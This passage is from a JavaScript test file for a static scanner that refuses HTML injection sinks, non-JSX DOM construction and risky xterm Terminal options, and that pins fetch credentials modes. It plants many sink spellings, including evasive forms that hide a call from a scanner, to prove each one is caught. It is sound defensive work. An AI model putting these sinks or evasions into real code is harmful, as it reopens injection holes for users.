      const callee = node.expression;
      const called = spelledName(callee);
      if ((called === 'write' || called === 'writeln') && ts.isPropertyAccessExpression(callee)
        && callee.expression.getText(syntax) === 'document') {
        found.push(`a document.${called} call`);
      }
      const [attribute] = node.arguments;
      if (called === 'setAttribute' && attribute !== undefined && ts.isStringLiteralLike(attribute)
        && attribute.text.toLowerCase() === 'style') {
        found.push('a setAttribute style call');
      }
    }
    if (ts.isNewExpression(node) && node.expression.getText(syntax) === 'Terminal') {
      terminals += 1;
      if (!literalFontFamily(node)) found.push('a Terminal whose fontFamily is not a string literal');
      if (setsWindowOptions(node)) found.push('a Terminal that sets windowOptions');
    }
    if (assignsPinnedOption(node)) found.push('a later fontFamily or windowOptions assignment');
    if (ts.isJsxOpeningElement(node) || ts.isJsxSelfClosingElement(node)) {
      tags += 1;
      const tag = node.tagName;
      const intrinsic = isIntrinsicTagName(tag);
      if (!intrinsic && !(ts.isIdentifier(tag) && bound.has(tag.text))) {
        found.push(`a dynamic tag <${tag.getText(syntax)}>`);
      }
    }
    ts.forEachChild(node, walk);
  })(syntax);
  return { found: [...new Set(found)], admitted: [...admitted].map((at) => at.getText(syntax)), tags, terminals };
}

test('no control is built without JSX', async () => {
  // The control: each spelling this scan lists is planted, and each is found.
  const planted = builtWithoutJsx(`
    import { jsx } from 'react/jsx-runtime';
    import { createElement as make, cloneElement } from 'react';
    import * as React from 'react';
    const a = make('input', { type: 'hidden', name: 'cwd' });
    const b = [React.createElement('input'), document.createElement('input'), React['createElement']('input')];
    const c = [jsx('input', {}), jsxs('div', {}), cloneElement(a)];
    node.innerHTML = '<input>'; node.insertAdjacentHTML('beforeend', x); document.write('<p>'); new DOMParser();
    const Tag = 'input';
    const d = <><Tag name="cwd" /><props.Field /><div dangerouslySetInnerHTML={{ __html: x }} /></>;
  `, 'planted.tsx');
  assert.deepEqual(planted.found.sort(), [
    'a document.write call', 'a dynamic tag <Tag>', 'a dynamic tag <props.Field>', 'a use of cloneElement',
    'a use of createElement', 'a use of jsx', 'a use of jsxs', 'an HTML string sink, DOMParser',
    'an HTML string sink, dangerouslySetInnerHTML', 'an HTML string sink, innerHTML',
    'an HTML string sink, insertAdjacentHTML', 'an import from react/jsx-runtime',
  ], 'a way to build an element without JSX is no longer found');
  // The inline-style sinks, each planted on its own so one cannot hide behind another.
  for (const [spelling, kind] of [
    ['frame.srcdoc = page;', 'an HTML string sink, srcdoc'],
    ['const f = <iframe srcDoc={page} />;', 'an HTML string sink, srcDoc'],
    ['node.setHTMLUnsafe(page);', 'an HTML string sink, setHTMLUnsafe'],
    ['const doc = Document.parseHTMLUnsafe(page);', 'an HTML string sink, parseHTMLUnsafe'],
    ["document.writeln('<p>');", 'a document.writeln call'],
    ["node.setAttribute('style', css);", 'a setAttribute style call'],
    ['node.setAttribute("STYLE", css);', 'a setAttribute style call'],
    ['new Terminal({ fontFamily: row.name });', 'a Terminal whose fontFamily is not a string literal'],
    ['new Terminal({ fontSize: 14 });', 'a Terminal whose fontFamily is not a string literal'],
    ['new Terminal();', 'a Terminal whose fontFamily is not a string literal'],
    ["new Terminal({ fontFamily: 'monospace', ...options });", 'a Terminal whose fontFamily is not a string literal'],
    ["new Terminal({ fontFamily: 'monospace', windowOptions: { getWinTitle: true } });",
      'a Terminal that sets windowOptions'],
    ['term.options.fontFamily = row.name;', 'a later fontFamily or windowOptions assignment'],
    ["term.options['fontFamily'] = 'monospace';", 'a later fontFamily or windowOptions assignment'],
    ['term.options.windowOptions = { getWinTitle: true };', 'a later fontFamily or windowOptions assignment'],
    ["this.term['options'].windowOptions ??= {};", 'a later fontFamily or windowOptions assignment'],
  ]) {
    assert.deepEqual(builtWithoutJsx(spelling, 'planted.tsx').found, [kind], `${spelling} is not found`);
  }
  // A copy of an element already on the page, and each way to put a node into it, planted on its own;
  // `append`, whose message differs, is planted with the other spellings below.
  for (const name of ['cloneNode', 'importNode', 'adoptNode', 'appendChild', 'prepend', 'insertBefore',
    'replaceChild', 'replaceChildren', 'replaceWith', 'insertAdjacentElement', 'moveBefore', 'insertNode',
    'surroundContents']) {
    assert.deepEqual(builtWithoutJsx(`field.${name}(copy);`, 'planted.tsx').found, [`a use of ${name}`],
      `a call to ${name} is not found`);
  }
  assert.deepEqual(builtWithoutJsx("const copy = document['importNode'](field, true);", 'planted.tsx').found,
    ['a use of importNode']);
  // And ordinary components, imported or declared here, are not taken for one, nor is a declared name or an
  // attribute's text. Nor is a `BUILDERS` name read only through a TypeScript type position — a type reference,
  // a literal type, a `typeof` type query — since none of those run; and nor is a refused name passed as a
  // string prop on a lowercase (DOM) tag, which the scan already exempted.
  const clean = builtWithoutJsx(`
    import { useState } from 'react';
    import { AgentDetail } from './AgentDetail.tsx';
    function Local() { return <div className="x" />; }
    export function View({ row }) {
      const [open] = useState(false);
      return <><AgentDetail row={row} /><Local />{open ? <button type="button" /> : null}</>;
    }
    const screen = new Terminal({ fontFamily: 'ui-monospace, monospace', fontSize: 14 });
    screen.options.disableStdin = true; screen.options.theme = theme; const same = screen.options.fontFamily === 'x';
    node.setAttribute('aria-label', row.name);
    function append(list, item) { return [...list, item]; }
    const caption = <span title="Image" />;
    let typedOnly: Option<string> | undefined;
    type Kind = 'Image' | 'Audio';
    type Ctor = typeof Image;
    const field = <input value="appendChild" />;
  `, 'clean.tsx');
  assert.deepEqual(clean.found, []);
  assert.equal(clean.tags, 6);

  const carrying = [];
  const admitted = [];
  let files = 0;
  let tags = 0;
  let terminals = 0;
  for (const path of await filesUnder(source, ['.ts', '.tsx'])) {
    const relative = path.slice(floor.length + 1);
    const scanned = builtWithoutJsx(await readFile(path, 'utf8'), relative);
    files += 1;
    tags += scanned.tags;
    terminals += scanned.terminals;
    if (scanned.found.length > 0) carrying.push(`${relative}: ${scanned.found.join(', ')}`);
    admitted.push(...scanned.admitted.map((call) => `${relative}: ${call}`));
  }
  assert.ok(files >= 10 && tags >= 100, `the scan read ${files} files and ${tags} JSX tags, so it measured nothing`);
  assert.deepEqual(carrying, [], 'a control is built without JSX');
  assert.deepEqual(admitted, ["src/renderer/figurePortrait.ts: document.createElement('canvas').getContext('webgl2')"],
    'the admitted build is not made exactly once');
  assert.equal(terminals, 1, 'the floor does not build its one terminal, so the fontFamily check measured nothing');
});

test('a refused name is found however the source reads it', () => {
  // Each row is planted on its own, so one spelling cannot hide behind another.
  const append = 'a use of append (URLSearchParams, Headers and FormData have an append too: '
    + "admit one that is not the DOM's by its exact text in ADMITTED_BUILDS)";
  const rows = [
    ['const copy = field.cloneNode; copy.call(field, true);', ['a use of cloneNode']],
    ['field.cloneNode.apply(field, [true]);', ['a use of cloneNode']],
    ['const copy = field.cloneNode.bind(field);', ['a use of cloneNode']],
    ['const { cloneNode } = field;', ['a use of cloneNode']],
    ["const { 'cloneNode': copy } = field;", ['a use of cloneNode']],
    ['({ cloneNode: copy } = field);', ['a use of cloneNode']],
    ['function put({ appendChild }) { return appendChild; }', ['a use of appendChild']],
    ['Node.prototype.appendChild.call(host, field);', ['a use of appendChild']],
    ['(host.appendChild)(field);', ['a use of appendChild']],
    ['(0, host.appendChild)(field);', ['a use of appendChild']],
    ['host?.appendChild(field);', ['a use of appendChild']],
    ['Reflect.apply(Node.prototype.cloneNode, field, []);', ['a use of cloneNode']],
    ["Reflect.get(Node.prototype, 'appendChild').call(host, field);", ['a use of appendChild']],
    ["const name = 'cloneNode'; field[name](true);", ['a use of cloneNode']],
    ['field[`cloneNode`](true);', ['a use of cloneNode']],
    ['field.clone\\' + 'u004eode(true);', ['a use of cloneNode']],
    ["import { createElement as make } from 'react'; make('input');", ['a use of createElement']],
    ["import { append } from './list.ts'; append(rows, row);", [append]],
    ["const query = new URLSearchParams(); query.append('q', text);", [append]],
    ['const picture = new Image();', ['a use of Image']],
    ["const choice = new Option('Yes', 'yes');", ['a use of Option']],
    ['const sound = new Audio();', ['a use of Audio']],
    ['const Make = window.Option; void new Make();', ['a use of Option']],
    ["customElements.define('x-field', Field);", ['a use of customElements']],
    ["window['customElements'].define('x-field', Field);", ['a use of customElements']],
    ['const registry = new CustomElementRegistry();', ['a use of CustomElementRegistry']],
    ['node.setHTML(page, { sanitizer });', ['an HTML string sink, setHTML']],
    ['const doc = Document.parseHTML(page);', ['an HTML string sink, parseHTML']],
    ["document.execCommand('insertHTML', false, page);", ['an HTML string sink, execCommand']],
    ["const doc = new DOMParser().parseFromString(page, 'text/html');", ['an HTML string sink, DOMParser']],
    ['const parser = new window.DOMParser();', ['an HTML string sink, DOMParser']],
    ['const { setHTMLUnsafe } = node;', ['an HTML string sink, setHTMLUnsafe']],
    ['Object.assign(node, { innerHTML: page });', ['an HTML string sink, innerHTML']],
    ["frame.setAttribute('srcdoc', page);", ['an HTML string sink, srcdoc']],
    // A class heritage clause runs, even though TypeScript parses it as a type node.
    ['class F extends Audio {}', ['a use of Audio']],
    // A refused name passed as a JSX string prop is a component's to read, unless the tag is a DOM element.
    ['function Put({ how }) { return host[how](x); } const el = <Put how="appendChild" />;', ['a use of appendChild']],
  ];
  assert.deepEqual(rows.map(([spelling]) => [spelling, builtWithoutJsx(spelling, 'planted.tsx').found]), rows);
});

test('the portrait probe is admitted only as its whole pinned expression', () => {
  const probeFile = 'src/renderer/figurePortrait.ts';
  const expression = "document.createElement('canvas').getContext('webgl2')";
  // The positive control first. Anywhere else, or with the canvas bound to a name, passed on or put into the
  // page, the same build is refused.
  const rows = [
    [`const probe = ${expression};`, probeFile, [], [expression]],
    [`const probe = ${expression};`, 'src/renderer/Portrait.tsx', ['a use of createElement'], []],
    ["const canvas = document.createElement('canvas'); target.after(canvas);", probeFile,
      ['a use of createElement'], []],
    ["const canvas = document.createElement('canvas'); canvas.getContext('webgl2');", probeFile,
      ['a use of createElement'], []],
    ["let canvas; (canvas = document.createElement('canvas')).getContext('webgl2');", probeFile,
      ['a use of createElement'], []],
    ["const [canvas] = [document.createElement('canvas')]; canvas.getContext('webgl2');", probeFile,
      ['a use of createElement'], []],
    ["((canvas) => canvas.getContext('webgl2'))(document.createElement('canvas'));", probeFile,
      ['a use of createElement'], []],
    ["target.after(document.createElement('canvas'));", probeFile, ['a use of createElement'], []],
    ["const probe = document.createElement('canvas').getContext('2d');", probeFile, ['a use of createElement'], []],
    ['const probe = document.createElement("canvas").getContext("webgl2");', probeFile,
      ['a use of createElement'], []],
    ["const probe = document.createElement('input');", probeFile, ['a use of createElement'], []],
    ['const probe = target.cloneNode(false);', probeFile, ['a use of cloneNode'], []],
  ];
  assert.deepEqual(rows.map(([spelling, file]) => {
    const scanned = builtWithoutJsx(spelling, file);
    return [spelling, file, scanned.found, scanned.admitted];
  }), rows);
});

/** Each `fetch('/path', { credentials })` call in `text`, as `path` to the literal credentials mode. */
function credentialsByPath(text) {
  const modes = {};
  (function walk(node) {
    if (ts.isCallExpression(node) && node.expression.getText() === 'fetch') {
      const [path, init] = node.arguments;
      const credentials = init !== undefined && ts.isObjectLiteralExpression(init)
        ? init.properties.find((property) => ts.isPropertyAssignment(property) && spelledName(property.name) === 'credentials')
        : undefined;
      modes[path.text] = credentials !== undefined && ts.isStringLiteralLike(credentials.initializer)
        ? credentials.initializer.text : null;
    }
    ts.forEachChild(node, walk);
  })(ts.createSourceFile('session.ts', text, ts.ScriptTarget.Latest, true));
  return modes;
}

test('the session module reads the served index with no credentials and sends each exchange with its own', async () => {
  const text = await readFile(resolve(source, 'session.ts'), 'utf8');
  assert.deepEqual(credentialsByPath(text), {
    '/floor/session': 'same-origin',
    '/floor/': 'omit',
    '/floor/session/recover': 'same-origin',
  });
  assert.equal(credentialsByPath(text.replace("credentials: 'omit'", "credentials: 'same-origin'"))['/floor/'], 'same-origin',
    'the pin does not see the served-index read take credentials');
  assert.equal(credentialsByPath(text.replace("credentials: 'omit',", ''))['/floor/'], null,
    'the pin does not see the served-index read lose its credentials mode');
});
